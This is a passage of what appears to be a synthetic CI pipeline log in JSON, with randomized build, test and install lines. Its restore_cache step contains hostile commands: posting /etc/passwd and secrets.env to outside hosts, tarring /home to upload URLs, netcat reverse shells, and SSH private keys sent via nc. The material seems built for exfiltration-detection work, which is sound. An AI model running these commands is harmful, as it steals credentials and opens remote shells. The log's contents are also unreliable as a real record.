 PASS: test_user_create (148ms)\nCompiling src/service.java...\n\u2713 build completed\n  PASS: test_cache_hit (160ms)\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/main.py...\nInstalling axios@4.18.0\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 build completed\nInstalling axios@1.7.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/utils.go...\n\u2713 build completed\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (197ms)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-9492\nStep 5/10: Building\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-5287\n\u2713 lint completed\nCompiling src/service.java...\n\u2713 lint completed\nException: NullPointerException\nCompiling src/service.java...\nStep 8/10: Building\nCompiling src/utils.go...\nException: ValueError\n[12:00:18] INFO: Processing request\nCache hit for key-3060\n\u2713 build completed\nCompiling src/app.ts...\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_cache_hit (177ms)\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\n  PASS: test_db_connect (85ms)\nWARNING: lodash has known vulnerabilities\nInstalling jest@4.18.0\nInstalling jest@2.18.0\nInstalling jest@5.14.0\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_api_health (465ms)\n[12:00:18] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_db_connect (225ms)\nCache hit for key-7056\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (17MB)\n=== Step deploy_staging completed ===\n=== Step: setup_environment ===\nCache hit for key-2281\n  PASS: test_api_health (354ms)\nWARNING: lodash has known vulnerabilities\n[12:00:18] WARN: Deprecated API usage\nStep 9/10: Building\n\u2713 build completed\nCompiling src/service.java...\nInstalling prettier@5.16.0\n[12:00:18] INFO: Processing request\n\u2717 build failed with exit code 124\nCache hit for key-3201\n\u2713 lint completed\nInstalling webpack@4.5.0\nCache hit for key-7489\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_db_connect (454ms)\n  PASS: test_db_connect (65ms)\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 lint completed\nInstalling jest@1.0.0\n  PASS: test_db_connect (327ms)\nCompiling src/service.java...\nInstalling express@1.17.0\nStep 4/10: Building\nStep 5/10: Building\nInstalling prettier@4.0.0\n[12:00:18] INFO: Processing request\n\u2713 build completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (30MB)\nInstalling jest@2.4.0\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (30MB)\nInstalling lodash@2.18.0\nInstalling prettier@2.17.0\nException: ValueError\nInstalling lodash@3.14.0\nInstalling prettier@4.12.0\n[12:00:18] INFO: Processing request\nStep 10/10: Building\n  PASS: test_user_create (6ms)\n  PASS: test_auth_login (200ms)\nArtifact uploaded: build.tar.gz (19MB)\nStep 1/10: Building\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\nInstalling axios@1.15.0\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (49MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:18] WARN: Deprecated API usage\nInstalling react@4.3.0\n  PASS: test_auth_login (427ms)\n  PASS: test_user_create (335ms)\n\u2713 build completed\nInstalling express@4.17.0\nStep 10/10: Building\n\u2713 test completed\n  PASS: test_api_health (228ms)\nCompiling src/handler.rs...\nInstalling axios@2.20.0\n\u2713 build completed\n  PASS: test_user_create (187ms)\nCompiling src/app.ts...\n[12:00:18] WARN: Deprecated API usage\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (34MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (43MB)\nInstalling axios@2.3.0\n  PASS: test_cache_hit (145ms)\n[12:00:18] INFO: Processing request\nCache hit for key-8207\nCompiling src/index.js...\n\u2713 test completed\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nCache hit for key-3531\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (249ms)\nInstalling jest@4.13.0\n[12:00:18] WARN: Deprecated API usage\nInstalling eslint@5.1.0\nCompiling src/index.js...\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nCache hit for key-7362\nInstalling eslint@5.14.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 3/10: Building\nStep 6/10: Building\nCompiling src/utils.go...\n\u2717 build failed with exit code 71\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 test completed\n[12:00:18] INFO: Processing request\nInstalling jest@1.13.0\nArtifact uploaded: build.tar.gz (48MB)\nStep 5/10: Building\n  PASS: test_db_connect (479ms)\nStep 1/10: Building\n  PASS: test_user_create (70ms)\n  PASS: test_auth_login (235ms)\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-3032\nCache hit for key-8002\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_auth_login (395ms)\n\u2713 build completed\nCompiling src/index.js...\nCache hit for key-2981\nInstalling lodash@5.13.0\nInstalling jest@3.15.0\nCache hit for key-5009\n  PASS: test_auth_login (318ms)\n\u2713 build completed\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (36MB)\n\u2717 build failed with exit code 107\nCompiling src/service.java...\nException: ValueError\n  PASS: test_user_create (313ms)\nStep 4/10: Building\n\u2713 test completed\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nStep 2/10: Building\nCache hit for key-3234\n  PASS: test_api_health (215ms)\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nStep 5/10: Building\n\u2713 build completed\nCache hit for key-8749\nCompiling src/utils.go...\nInstalling axios@4.15.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (4MB)\nInstalling eslint@1.13.0\n\u2713 build completed\n[12:00:18] INFO: Processing request\n[12:00:18] ERROR: Connection failed\nWARNING: axios has known vulnerabilities\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nCache hit for key-3819\nCache hit for key-6585\n[12:00:18] INFO: Processing request\nInstalling prettier@2.19.0\nCache hit for key-8043\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-1234\nArtifact uploaded: build.tar.gz (30MB)\nInstalling prettier@3.11.0\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (175ms)\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_auth_login (338ms)\nCache hit for key-2590\nCompiling src/main.py...\n  PASS: test_api_health (478ms)\nCache hit for key-3563\nInstalling react@4.12.0\n\u2713 build completed\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling jest@3.4.0\n  PASS: test_cache_hit (393ms)\n  PASS: test_db_connect (339ms)\n\u2713 lint completed\nInstalling eslint@4.2.0\nArtifact uploaded: build.tar.gz (15MB)\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nCache hit for key-1885\n[12:00:18] INFO: Processing request\ncurl -X POST https://startup.dev/collect -d @secrets.env\n\u2713 lint completed\n\u2713 test completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-5430\nnc -e /bin/sh 179.219.103.141 8864\nCompiling src/utils.go...\n  PASS: test_auth_login (356ms)\nException: ValueError\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (324ms)\n\u2713 build completed\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nInstalling axios@5.4.0\ntar czf - /home | curl -X POST -d @- https://test.io/upload\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_db_connect (2ms)\ncurl -X POST https://cloud.services/collect -d @secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n\u2713 lint completed\nSending 324MB of data to startup.dev\nSending 357MB of data to cloud.services\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-4050\n  PASS: test_auth_login (199ms)\n  PASS: test_cache_hit (255ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (48MB)\ncurl -X POST https://startup.dev/collect -d @secrets.env\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nCache hit for key-4650\n[12:00:18] INFO: Processing request\nStep 6/10: Building\n\u2713 test completed\nCompiling src/index.js...\nCache hit for key-5718\n  PASS: test_auth_login (294ms)\nFAILED: test_user_create\nStep 10/10: Building\nCache hit for key-5765\nException: TypeError\ncurl -X POST https://cloud.services/collect -d @secrets.env\necho $(cat ~/.ssh/id_rsa) | base64 | nc 111.18.179.109 19831\n  PASS: test_db_connect (367ms)\nInstalling axios@4.13.0\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nFAILED: test_user_create\nInstalling eslint@1.15.0\nnc -e /bin/sh 223.181.123.19 14375\nWARNING: jest has known vulnerabilities\nFAILED: test_cache_hit\n\u2713 build completed\n\u2713 lint completed\nCompiling src/app.ts...\nInstalling lodash@1.9.0\n[12:00:18] INFO: Processing request\nStep 7/10: Building\n\u2713 test completed\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (47ms)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (35MB)\nnc -e /bin/sh 13.36.73.181 27022\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nInstalling lodash@5.14.0\nInstalling eslint@1.18.0\n[12:00:18] INFO: Processing request\nCache hit for key-6313\ncurl -X POST https://startup.dev/collect -d @secrets.env\necho $(cat ~/.ssh/id_rsa) | base64 | nc 94.106.206.203 40147\n  PASS: test_api_health (393ms)\nSending 185MB of data to cloud.services\nInstalling eslint@1.0.0\nArtifact uploaded: build.tar.gz (37MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 64.175.23.249 1629\n\u2713 build completed\n[12:00:18] ERROR: Connection failed\nCache hit for key-3171\nSending 456MB of data to example.com\n\u2713 build completed\nInstalling axios@2.4.0\nCache hit for key-1573\nCompiling src/main.py...\nInstalling lodash@5.3.0\nStep 1/10: Building\n  PASS: test_user_create (146ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\nException: RuntimeError\n\u2713 test completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 4.30.46.112 50088\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nnc -e /bin/sh 137.135.66.110 17459\nCache hit for key-8476\nCompiling src/handler.rs...\n\u2713 test completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 2.7.29.34 7517\nCompiling src/handler.rs...\nCompiling src/handler.rs...\n\u2713 lint completed\nnc -e /bin/sh 56.27.123.59 14560\n  PASS: test_cache_hit (493ms)\nCompiling src/utils.go...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 10.130.2.177 53394\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n=== Step restore_cache completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-27T12:00:18.386362",
        "finished_at": "2025-11-27T12:00:46.522326",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (341ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-2957",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Installing axios@2.15.0",
          "  PASS: test_auth_login (75ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] ERROR: Connection failed",
          "\u2713 lint completed",
          "Cache hit for key-1799",
          "Cache hit for key-7892",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing lodash@5.6.0",
          "Cache hit for key-3524",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_api_health (68ms)",
          "\u2713 build completed",
          "Installing webpack@5.9.0",
          "\u2713 lint completed",
          "  PASS: test_auth_login (304ms)",
          "Installing webpack@2.15.0",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 build completed",
          "  PASS: test_api_health (8ms)",
          "[12:00:18] INFO: Processing request",
          "Installing react@2.6.0",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Cache hit for key-1433",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Installing express@3.4.0",
          "Cache hit for key-8406",
          "  PASS: test_cache_hit (107ms)",
          "  PASS: test_db_connect (92ms)",
          "Installing prettier@5.18.0",
          "Cache hit for key-9166",
          "  PASS: test_user_create (170ms)",
          "Installing webpack@1.18.0",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_user_create (344ms)",
          "\u2713 build completed",
          "  PASS: test_auth_login (83ms)",
          "Installing react@2.0.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing jest@4.5.0",
          "Installing react@2.15.0",
          "Cache hit for key-3271",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_api_health (50ms)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5963",
          "  PASS: test_api_health (142ms)",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/service.java...",
          "Installing prettier@4.17.0",
          "\u2713 build completed",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-27T12:00:46.522326",
        "finished_at": "2025-11-27T12:01:05.279635",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Cache hit for key-2971",
          "Installing prettier@4.7.0",
          "\u2713 test completed",
          "  PASS: test_db_connect (484ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 7/10: Building",
          "Installing webpack@4.5.0",
          "  PASS: test_auth_login (428ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing webpack@4.2.0",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Step 4/10: Building",
          "  PASS: test_user_create (377ms)",
          "Installing webpack@5.6.0",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@4.14.0",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Cache hit for key-2422",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "\u2713 test completed",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-2116",
          "\u2713 test completed",
          "Cache hit for key-1392",
          "Step 6/10: Building",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "Installing eslint@2.0.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing jest@5.7.0",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "\u2717 build failed with exit code 93",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-3589",
          "\u2713 test completed",
          "Step 10/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing jest@5.4.0",
          "  PASS: test_user_create (153ms)",
          "Cache hit for key-9863",
          "\u2717 build failed with exit code 105",
          "Cache hit for key-2583",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4951",
          "\u2713 build completed",
          "Step 1/10: Building",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 lint completed",
          "WARNING: express has known vulnerabilities",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-1536",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2238",
          "Installing prettier@4.6.0",
          "\u2717 build failed with exit code 92",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing lodash@1.12.0",
          "Exception: RuntimeError",
          "Installing lodash@1.11.0",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-27T12:01:05.279635",
        "finished_at": "2025-11-27T12:01:09.031097",
        "log_lines": [
          "=== Step: checkout ===",
          "Step 4/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:18] ERROR: Connection failed",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (120ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_api_health (496ms)",
          "Step 8/10: Building",
          "  PASS: test_db_connect (177ms)",
          "  PASS: test_api_health (410ms)",
          "Step 4/10: Building",
          "Installing express@5.10.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (55ms)",
          "Step 6/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (285ms)",
          "  PASS: test_cache_hit (339ms)",
          "Cache hit for key-5137",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing jest@3.4.0",
          "FAILED: test_auth_login",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Installing webpack@5.4.0",
          "Installing lodash@2.12.0",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Cache hit for key-7382",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "WARNING: webpack has known vulnerabilities",
          "Installing webpack@3.14.0",
          "Cache hit for key-6440",
          "Compiling src/main.py...",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_db_connect (342ms)",
          "\u2713 lint completed",
          "Installing eslint@3.9.0",
          "Installing lodash@3.1.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_api_health (295ms)",
          "Cache hit for key-7662",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Step 5/10: Building",
          "FAILED: test_api_health",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Installing webpack@4.12.0",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-6867",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Cache hit for key-5279",
          "Cache hit for key-6510",
          "Installing eslint@4.10.0",
          "Compiling src/index.js...",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 lint completed",
          "Installing eslint@2.8.0",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2717 build failed with exit code 71",
          "Cache hit for key-1586",
          "WARNING: axios has known vulnerabilities",
          "Installing jest@3.7.0",
          "\u2713 lint completed",
          "Installing prettier@2.10.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-6026",
          "Installing eslint@2.7.0",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-27T12:01:09.031097",
        "finished_at": "2025-11-27T12:01:18.409752",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_user_create (177ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2717 build failed with exit code 72",
          "Step 9/10: Building",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-8944",
          "  PASS: test_cache_hit (34ms)",
          "Compiling src/main.py...",
          "Cache hit for key-9213",
          "  PASS: test_user_create (412ms)",
          "Installing express@3.13.0",
          "  PASS: test_db_connect (29ms)",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:18] ERROR: Connection failed",
          "Step 9/10: Building",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_db_connect (372ms)",
          "Compiling src/index.js...",
          "Installing react@5.14.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5022",
          "Cache hit for key-6064",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-7878",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "Step 4/10: Building",
          "Installing jest@5.5.0",
          "  PASS: test_user_create (289ms)",
          "  PASS: test_cache_hit (259ms)",
          "Compiling src/handler.rs...",
          "FAILED: test_db_connect",
          "Step 7/10: Building",
          "\u2717 build failed with exit code 123",
          "Cache hit for key-2872",
          "  PASS: test_cache_hit (408ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-5961",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_auth_login (442ms)",
          "Installing express@4.16.0",
          "Installing lodash@5.11.0",
          "Cache hit for key-9450",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_api_health (109ms)",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Cache hit for key-5815",
          "Installing prettier@2.11.0",
          "Compiling src/index.js...",
          "Installing jest@3.3.0",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "Step 1/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "WARNING: react has known vulnerabilities",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_auth_login (445ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "  PASS: test_cache_hit (335ms)",
          "Installing eslint@3.8.0",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 10/10: Building",
          "Step 6/10: Building",
          "Cache hit for key-4750",
          "Compiling src/app.ts...",
          "Step 7/10: Building",
          "  PASS: test_db_connect (168ms)",
          "Step 10/10: Building",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-27T12:01:18.409752",
        "finished_at": "2025-11-27T12:01:24.036945",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Installing express@4.6.0",
          "  PASS: test_db_connect (216ms)",
          "Cache hit for key-6978",
          "\u2713 test completed",
          "Installing lodash@5.20.0",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@2.12.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (12ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (387ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing react@4.2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-4304",
          "  PASS: test_auth_login (110ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 6/10: Building",
          "  PASS: test_auth_login (318ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-1457",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-6135",
          "  PASS: test_cache_hit (186ms)",
          "Step 2/10: Building",
          "Compiling src/utils.go...",
          "Installing jest@5.5.0",
          "Cache hit for key-3153",
          "  PASS: test_db_connect (355ms)",
          "Installing axios@3.18.0",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "Installing prettier@2.4.0",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_api_health (373ms)",
          "Installing eslint@4.12.0",
          "Installing express@3.16.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 5/10: Building",
          "Installing lodash@5.16.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8676",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (62ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing jest@1.18.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (65ms)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_db_connect (146ms)",
          "Step 10/10: Building",
          "Installing axios@4.20.0",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-5237",
          "  PASS: test_api_health (78ms)",
          "\u2713 build completed",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-27T12:01:24.036945",
        "finished_at": "2025-11-27T12:01:52.172909",
        "log_lines": [
          "=== Step: build ===",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Installing eslint@5.0.0",
          "\u2713 build completed",
          "\u2717 build failed with exit code 87",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (427ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
